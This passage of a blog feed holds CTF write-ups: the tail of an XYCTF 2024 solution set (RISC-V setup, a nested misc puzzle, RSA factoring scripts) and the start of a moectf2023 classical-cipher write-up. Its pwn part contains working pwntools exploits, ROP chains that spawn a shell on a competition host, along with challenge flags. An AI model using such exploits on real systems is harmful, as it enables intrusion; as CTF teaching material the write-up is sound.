‘/lib/ld-linux-riscv64-lp64d.so.1’: No such file or directory</p><p>百度搜索，<a href="https://blog.csdn.net/bebebug/article/details/127829361">找到文章</a>，执行代码</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><br>sudo apt <span class="hljs-keyword">install</span> libc6-riscv64-cross<br>sudo apt <span class="hljs-keyword">install</span> binutils-riscv64-linux-gnu<br>sudo apt <span class="hljs-keyword">install</span> gcc-riscv64-linux-gnu<br>sudo apt <span class="hljs-keyword">install</span> binutils-riscv64-unknown-elf<br>sudo apt <span class="hljs-keyword">install</span> gcc-riscv64-unknown-elf<br>sudo apt <span class="hljs-keyword">install</span> qemu-system-misc<br>sudo apt <span class="hljs-keyword">install</span> qemu-user<br><br>sudo cp /usr/riscv64-linux-gnu/lib/* /lib/<br><br></code></pre></td></tr></table></figure><p>运行附件得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240407124249519.png" class title="image-20240407124249519"><p>将1换成0，即可得flag</p><img src="/2024/04/29/XYCTF2024WP/image-20240415202639649.png" class title="image-20240415202639649"><h3 id="九转修仙转（未完成）"><a href="#九转修仙转（未完成）" class="headerlink" title="九转修仙转（未完成）"></a>九转修仙转（未完成）</h3><p>压缩包最外层密码：XYCTF20240401</p><h4 id="炼气-天书解密"><a href="#炼气-天书解密" class="headerlink" title="炼气:天书解密"></a>炼气:天书解密</h4><img src="/2024/04/29/XYCTF2024WP/image-20240407203224965.png" class title="image-20240407203224965"><p>爆破图片宽高得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240407203514580.png" class title="image-20240407203514580"><h4 id="筑基"><a href="#筑基" class="headerlink" title="筑基"></a>筑基</h4><p>随波逐流一键解密，<strong>BubbleBabble</strong>编码</p><img src="/2024/04/29/XYCTF2024WP/image-20240516182259641.png" class title="image-20240516182259641"><p>LSB隐写得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240516182801225.png" class title="image-20240516182801225"><p>base64解码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0f_crypt0_and_<br></code></pre></td></tr></table></figure><h4 id="结丹"><a href="#结丹" class="headerlink" title="结丹"></a>结丹</h4><p>摩斯密码（四个交点为”-”，三个交点为空格，一个交点为”.”）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">- <span class="hljs-string">....</span> . <span class="hljs-string">..--.-</span> - <span class="hljs-string">....</span> <span class="hljs-string">..</span> <span class="hljs-string">.-.</span> -<span class="hljs-string">..</span><br></code></pre></td></tr></table></figure><p>打开flag.zip提示有额外数据，010查看</p><img src="/2024/04/29/XYCTF2024WP/image-20240516183319807.png" class title="image-20240516183319807"><p>解码得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240516183531174.png" class title="image-20240516183531174"><h4 id="第四层：元婴"><a href="#第四层：元婴" class="headerlink" title="第四层：元婴"></a>第四层：元婴</h4><img src="/2024/04/29/XYCTF2024WP/image-20240407220852148.png" class title="image-20240407220852148"><h4 id="第5层：化神"><a href="#第5层：化神" class="headerlink" title="第5层：化神"></a>第5层：化神</h4><p>md5爆破得到压缩包密码：key{liuyyds}</p><h4 id="炼虚"><a href="#炼虚" class="headerlink" title="炼虚"></a>炼虚</h4><h4 id="合体"><a href="#合体" class="headerlink" title="合体"></a>合体</h4><h4 id="第8层：大乘-p-q-剪枝算法"><a href="#第8层：大乘-p-q-剪枝算法" class="headerlink" title="第8层：大乘   p^q  剪枝算法"></a>第8层：大乘   p^q  剪枝算法</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs 1c">n= <span class="hljs-number">22424440693845876425615937206198156323192795003070970628372481545586519202571910046980039629473774728476050491743579624370862986329470409383215065075468386728605063051384392059021805296376762048386684738577913496611584935475550170449080780985441748228151762285167935803792462411864086270975057853459586240221348062704390114311522517740143545536818552136953678289681001385078524272694492488102171313792451138757064749512439313085491407348218882642272660890999334401392575446781843989380319126813905093532399127420355004498205266928383926087604741654126388033455359539622294050073378816939934733818043482668348065680837</span><br>c= <span class="hljs-number">1400352566791488780854702404852039753325619504473339742914805493533574607301173055448281490457563376553281260278100479121782031070315232001332230779334468566201536035181472803067591454149095220119515161298278124497692743905005479573688449824603383089039072209462765482969641079166139699160100136497464058040846052349544891194379290091798130028083276644655547583102199460785652743545251337786190066747533476942276409135056971294148569617631848420232571946187374514662386697268226357583074917784091311138900598559834589862248068547368710833454912188762107418000225680256109921244000920682515199518256094121217521229357</span><br>gift= <span class="hljs-number">14488395911544314494659792279988617621083872597458677678553917360723653686158125387612368501147137292689124338045780574752580504090309537035378931155582239359121394194060934595413606438219407712650089234943575201545638736710994468670843068909623985863559465903999731253771522724352015712347585155359405585892</span><br>from Crypto.Util.number import*<br>from gmpy2 import*<br>import math<br><br><br>def check_cong(k, p, q, n, xored=None):<br>    kmask = (<span class="hljs-number">1</span> &lt;&lt; k) - <span class="hljs-number">1</span><br>    p <span class="hljs-meta">&amp;= kmask</span><br>    q <span class="hljs-meta">&amp;= kmask</span><br>    n <span class="hljs-meta">&amp;= kmask</span><br>    pqm = (p*q) <span class="hljs-meta">&amp; kmask</span><br>    return pqm == n and (xored is None or (p^q) == (xored <span class="hljs-meta">&amp; kmask))</span><br><br>def extend(k, a):<br>    kbit = <span class="hljs-number">1</span> &lt;&lt; (k-<span class="hljs-number">1</span>)<br>    assert a &lt; kbit<br>    yield a<br>    yield a <span class="hljs-string">| kbit</span><br><br>def factor(n, p_xor_q):<br>    tracked = set([(p, q) for p in [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>] for q in [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]<br>                   if check_cong(<span class="hljs-number">1</span>, p, q, n, p_xor_q)])<br><br>    PRIME_BITS = int(math.ceil(math.<span class="hljs-built_in">log</span>(n, <span class="hljs-number">2</span>)/<span class="hljs-number">2</span>))<br><br>    maxtracked = len(tracked)<br>    for k in range(<span class="hljs-number">2</span>, PRIME_BITS+<span class="hljs-number">1</span>):<br>        newset = set()<br>        for tp, tq in tracked:<br>            for newp_ in extend(k, tp):<br>                for newq_ in extend(k, tq):<br>                    <span class="hljs-meta"># Remove symmetry</span><br>                    newp, newq = sorted([newp_, newq_])<br>                    if check_cong(k, newp, newq, n, p_xor_q):<br>                        newset.add((newp, newq))<br><br>        tracked = newset<br>        if len(tracked) &gt; maxtracked:<br>            maxtracked = len(tracked)<br>    print('Tracked set size: {} (max={})'.format(len(tracked), maxtracked))<br><br>    <span class="hljs-meta"># go through the tracked set and pick the correct (p, q)</span><br>    for p, q in tracked:<br>        if p != <span class="hljs-number">1</span> and p*q == n:<br>            return p, q<br><br>    assert False, 'factors were not in tracked set. Is your p^q correct?'<br><br>p, q = factor(n, gift)<br>print(p)<br>print(q)<br>'''<br>p=<span class="hljs-number">14580549955135</span><span class="hljs-number">18375451706708</span><span class="hljs-number">39798336872366</span><span class="hljs-number">41438331104201</span><span class="hljs-number">83863865952880</span><span class="hljs-number">60139791135454</span><span class="hljs-number">98041301469392</span><span class="hljs-number">48669539726622</span><span class="hljs-number">66748526407954</span><span class="hljs-number">49287761042960</span><span class="hljs-number">28862443729240</span><span class="hljs-number">35960962307198</span><span class="hljs-number">91065947563933</span><span class="hljs-number">39458959227173</span><span class="hljs-number">07291255423855</span><span class="hljs-number">61627492458427</span><span class="hljs-number">05701261800503</span><span class="hljs-number">63106535962473</span><span class="hljs-number">04910757655631</span><span class="hljs-number">54610137558590</span><span class="hljs-number">97114552522187</span><span class="hljs-number">75517142362107</span>1<br>q=<span class="hljs-number">15379694704827</span><span class="hljs-number">04295104447564</span><span class="hljs-number">58855481287460</span><span class="hljs-number">63946856300121</span><span class="hljs-number">34899076251324</span><span class="hljs-number">38953570738468</span><span class="hljs-number">18177092509186</span><span class="hljs-number">74397275190746</span><span class="hljs-number">85449940618659</span><span class="hljs-number">58311433850187</span><span class="hljs-number">26982207454735</span><span class="hljs-number">31199063071421</span><span class="hljs-number">85252161880576</span><span class="hljs-number">56279991061880</span><span class="hljs-number">15431567625318</span><span class="hljs-number">85089989505213</span><span class="hljs-number">01570378229609</span><span class="hljs-number">45909520973243</span><span class="hljs-number">79350774081743</span><span class="hljs-number">67075045057091</span><span class="hljs-number">94025074527084</span><span class="hljs-number">80305410760554</span>7<br>'''<br>e = <span class="hljs-number">65537</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>print(long_to_bytes(m))<br><span class="hljs-meta">#password{pruning_algorithm}</span><br></code></pre></td></tr></table></figure><img src="/2024/04/29/XYCTF2024WP/image-20240407213102631.png" class title="image-20240407213102631"><img src="/2024/04/29/XYCTF2024WP/image-20240407212856962.png" class title="image-20240407212856962"><img src="/2024/04/29/XYCTF2024WP/image-20240407212928896.png" class title="image-20240407212928896"><h4 id="第9层：渡劫"><a href="#第9层：渡劫" class="headerlink" title="第9层：渡劫"></a>第9层：渡劫</h4><p>hint9.py</p><p>  exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros">n = 107803636687595025440095910573280948384697923215825513033516157995095253288310988256293799364485832711216571624134612864784507225218094554935994320702026646158448403364145094359869184307003058983513345331145072159626461394056174457238947423145341933245269070758238088257304595154590196901297344034819899810707<br>c = 46049806990305232971805282370284531486321903483742293808967054648259532257631501152897799977808185874856877556594402112019213760718833619399554484154753952558768344177069029855164888168964855258336393700323750075374097545884636097653040887100646089615759824303775925046536172147174890161732423364823557122495<br>list = [618066045261118017236724048165995810304806699407382457834629201971935031874166645665428046346008581253113148818423751222038794950891638828062215121477677796219952174556774639587782398862778383552199558783726207179240239699423569318, 837886528803727830369459274997823880355524566513794765789322773791217165398250857696201246137309238047085760918029291423500746473773732826702098327609006678602561582473375349618889789179195207461163372699768855398243724052333950197]<br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-keyword">for</span> a1 <span class="hljs-keyword">in</span> range(256):<br>    <span class="hljs-keyword">for</span> a2 <span class="hljs-keyword">in</span> range(256):<br>        <span class="hljs-attribute">p</span>=gcd(list[0]<span class="hljs-number">*a1</span>-list[1]<span class="hljs-number">*a2</span>,n)<br>        <span class="hljs-keyword">if</span> n%<span class="hljs-attribute">p</span>==0 <span class="hljs-keyword">and</span> p!=1 <span class="hljs-keyword">and</span> p!=n:<br>            <span class="hljs-built_in">print</span>(list[0] * a1 - list[1] * a2 % n)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">'p='</span>,p)<br><br><br><span class="hljs-attribute">p</span>=12951283811821084332224320465045864899191924765916891677355364529850728204537369439910942929239876470054661306841056350863576815710640615409980095344446711<br><br><span class="hljs-attribute">q</span>=n//p<br><span class="hljs-built_in">print</span>(q,<span class="hljs-attribute">n</span>==p*q)<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-built_in">print</span>(gcd(e,(p-1)))<br><span class="hljs-attribute">d</span>=invert(e,(p-1))<br><span class="hljs-built_in">print</span>(d)<br><br><span class="hljs-attribute">m</span>=powmod(c%p,d,p)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b'game_over'</span><br></code></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="hello-world-签到"><a href="#hello-world-签到" class="headerlink" title="hello_world(签到)"></a>hello_world(签到)</h3><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">'amd64'</span>,os='linux',log_level='debug')<br>p = remote(<span class="hljs-string">'192.168.182.1'</span>,13830)<br><br>elf = ELF(<span class="hljs-string">"./vuln"</span>)<br>libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)<br><br><span class="hljs-attribute">payload</span>=b'a'*0x28<br>p.send(payload)<br><span class="hljs-attribute">base</span>=u64(p.recvuntil("\x7f")[-6:].ljust(8,b<span class="hljs-string">"\x00"</span>))-0x29d90<br><span class="hljs-attribute">pop_rdi</span>=0x2a3e5+base<br><span class="hljs-attribute">system</span>=base+libc.sym[<span class="hljs-string">'system'</span>]<br><span class="hljs-attribute">binsh</span>=base+0x1d8678<br><span class="hljs-attribute">ret</span>=base+0x2db7d<br><span class="hljs-attribute">payload</span>=b'a'*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br><br>p.sendlineafter(b<span class="hljs-string">'please input your name:'</span>,payload)<br>p.interactive()<br>XYCTF{a954b733-9403-42ee-b59f-ff006a2eac03}<br></code></pre></td></tr></table></figure><h3 id="static-link"><a href="#static-link" class="headerlink" title="static_link"></a>static_link</h3><p>exp</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="hljs-function"><span class="hljs-title">p</span> = <span class="hljs-title">remote</span><span class="hljs-params">('<span class="hljs-number">192.168</span>.<span class="hljs-number">182.1</span>',<span class="hljs-number">14286</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">pop_rdi</span> = 0<span class="hljs-title">x401f1f</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">pop_rsi</span> = 0<span class="hljs-title">x409f8e</span> </span><br><span class="hljs-function"><span class="hljs-title">pop_rdx</span> = 0<span class="hljs-title">x451322</span> </span><br><span class="hljs-function"><span class="hljs-title">pop_rax</span> = 0<span class="hljs-title">x447fe7</span> </span><br><span class="hljs-function"><span class="hljs-title">ret_addr</span> = 0<span class="hljs-title">x40101a</span> </span><br><span class="hljs-function"><span class="hljs-title">syscall_addr</span> = 0<span class="hljs-title">x447590</span> </span><br><span class="hljs-function"><span class="hljs-title">binsh_addr</span> = 0<span class="hljs-title">x4C5240</span> </span><br><span class="hljs-function"><span class="hljs-title">read_addr</span> = 0<span class="hljs-title">x447580</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload1</span> = <span class="hljs-title">b'a'</span>* 0<span class="hljs-title">x28</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> +<span class="hljs-title">p64</span><span class="hljs-params">(pop_rsi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(binsh_addr)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdx)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">256</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(read_addr)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rax)</span>+ <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">59</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(binsh_addr )</span>+<span class="hljs-title">p64</span><span class="hljs-params">(pop_rsi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdx)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(syscall_addr)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">send</span><span class="hljs-params">(payload1)</span> </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">send</span><span class="hljs-params">('/bin/sh')</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span> </span><br></code></pre></td></tr></table></figure><h3 id="guestbook1"><a href="#guestbook1" class="headerlink" title="guestbook1"></a>guestbook1</h3><p>exp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>(arch='amd64',os='linux',log_level='debug')<br><br><br><span class="hljs-attribute">p</span> = remote('<span class="hljs-number">192.168.182.1</span>',<span class="hljs-number">12571</span>)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"index\n"</span>,b'<span class="hljs-number">32</span>')<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"name:\n"</span>, b'<span class="hljs-number">111</span>')<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"id:\n"</span>, b'<span class="hljs-number">0</span>')<br><span class="hljs-attribute">ret_addr</span>=<span class="hljs-number">0</span>x40101A<br><span class="hljs-attribute">backdoor</span>=<span class="hljs-number">0</span>x40133A<br><span class="hljs-attribute">ls</span>=[<span class="hljs-number">58</span>,<span class="hljs-number">19</span>,<span class="hljs-number">64</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"index\n"</span>, b'%d'%i)<br><span class="hljs-attribute">p</span>.sendafter(b<span class="hljs-string">"name:\n"</span>, p64(backdoor)*<span class="hljs-number">2</span>)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"id:\n"</span>, b'%d'%ls[i%<span class="hljs-number">8</span>])<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"index\n"</span>, b'-<span class="hljs-number">1</span>')<br><span class="hljs-attribute">p</span>.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto Misc pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023</title>
    <link href="/2024/04/29/moectf2023/"/>
    <url>/2024/04/29/moectf2023/</url>
    
    <content type="html"><![CDATA[<p>wp是去年写的，记录了当时做出来的题，打算把去年题复现一遍，先把去年的wp修修发出来，其他的题慢慢再更新把</p><h1 id="Classical-crypto"><a href="#Classical-crypto" class="headerlink" title="Classical crypto"></a><strong>Classical crypto</strong></h1><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a><strong>ezrot</strong></h3><p>密文：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;<span class="hljs-variable">@64E</span>7LC<span class="hljs-variable">@Ecf0</span><span class="hljs-symbol">:D0</span>;<span class="hljs-variable constant_">FDE020D</span><span class="hljs-symbol">:&gt;</span>!=<span class="hljs-number">60</span>=6<span class="hljs-symbol">EE6C0DF3DE:</span><span class="hljs-variable constant_">EFE</span><span class="hljs-symbol">:</span>@<span class="hljs-string">?0</span>4<span class="hljs-symbol">:</span>!96C0tsAJdEA6d;F&#125;%0N<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;rot47_is_just_<span class="hljs-built_in">a_simPle</span>_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;<br></code></pre></td></tr></table></figure><p>根据题目描述，应当是rot密码，出现@！等符号，所以是rot47，用cyberchef解得flag</p><img src="/2024/04/29/moectf2023/clip_image002.png" class title="img"><h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a><strong>可可的新围墙</strong></h3><p>密文：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>jocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBro_lcsOp&#125;e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;F<span class="hljs-number">3</span><span class="hljs-symbol">nc3</span>_ciph<span class="hljs-number">3</span>r_shiFTs_<span class="hljs-number">3</span>ach_l<span class="hljs-number">3</span>TT<span class="hljs-number">3</span>r_By_a_Giv<span class="hljs-number">3</span><span class="hljs-symbol">n_nuMB3</span>r_oF_plac<span class="hljs-number">3</span>s_Ojpj&#125;<br></code></pre></td></tr></table></figure><p>​     根据密文特征（“{}”位置）猜测是栅栏密码，枚举未得到flag，再仔细观察，发现密文中m和e只出现过1次，即加密方式类似如下：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>j<br>ocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBro_lcsOp&#125;<br>e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>jocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBr<br>o_lcsOp&#125;<br>e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>猜测是w型栅栏，用脚本解得flag</p><img src="/2024/04/29/moectf2023/clip_image004.png" class title="img"><h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a><strong>皇帝的新密码</strong></h3><p>密文：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">tvljam</span><span class="hljs-template-variable">&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;CaEsaE_CIphEr_Is_<span class="hljs-built_in">a_vErY</span>_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;<br></code></pre></td></tr></table></figure><p>​     密文显示flag形式的字符串，且开头tvljam与moectf偏移量均为7，猜测是凯撒密码，解得</p><img src="/2024/04/29/moectf2023/clip_image006.png" class title="img"><h3 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a><strong>不是“皇帝的新密码”</strong></h3><p>密文：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">scsfct</span><span class="hljs-template-variable">&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;</span><br></code></pre></td></tr></table></figure><p>md5 of flag (utf-8) </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ea23f80270bdd96b5fcd213cae68eea5<br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;vIgENErE_CIphEr_Is_<span class="hljs-built_in">a_lIttlE</span>_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;<br></code></pre></td></tr></table></figure><p>​     根据密文，开头字母与moectf偏移量并不呈规律变化，不是凯撒密码，根据古典密码的特征，最有可能的是Vigenere，但我们并不会知道密钥，用moectf做密钥解密得</p><img src="/2024/04/29/moectf2023/clip_image008.png" class title="img"><p>发现密钥为goodjo，解得</p><img src="/2024/04/29/moectf2023/clip_image010.png" class title="img"><p>提交flag并不正确，再仔细观察信息，发现提示flag的md5值，将刚刚得到的flag计算md5</p><img src="/2024/04/29/moectf2023/clip_image012.png" class title="img"><p>发现刚刚得到的并不是flag，说明密钥不对，仔细观察，密钥出现good单词，剩下的jo极有可能是job，因此猜测密钥是goodjob，再进行·解密</p><img src="/2024/04/29/moectf2023/clip_image014.png" class title="img"><p>并计算md5</p><img src="/2024/04/29/moectf2023/clip_image016.png" class title="img"><p>发现值与题所给md5相同，得到正确flag</p><p>猫言喵语:</p><p>密文;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">喵喵？ 喵喵喵喵喵喵喵喵喵喵喵喵 喵喵喵 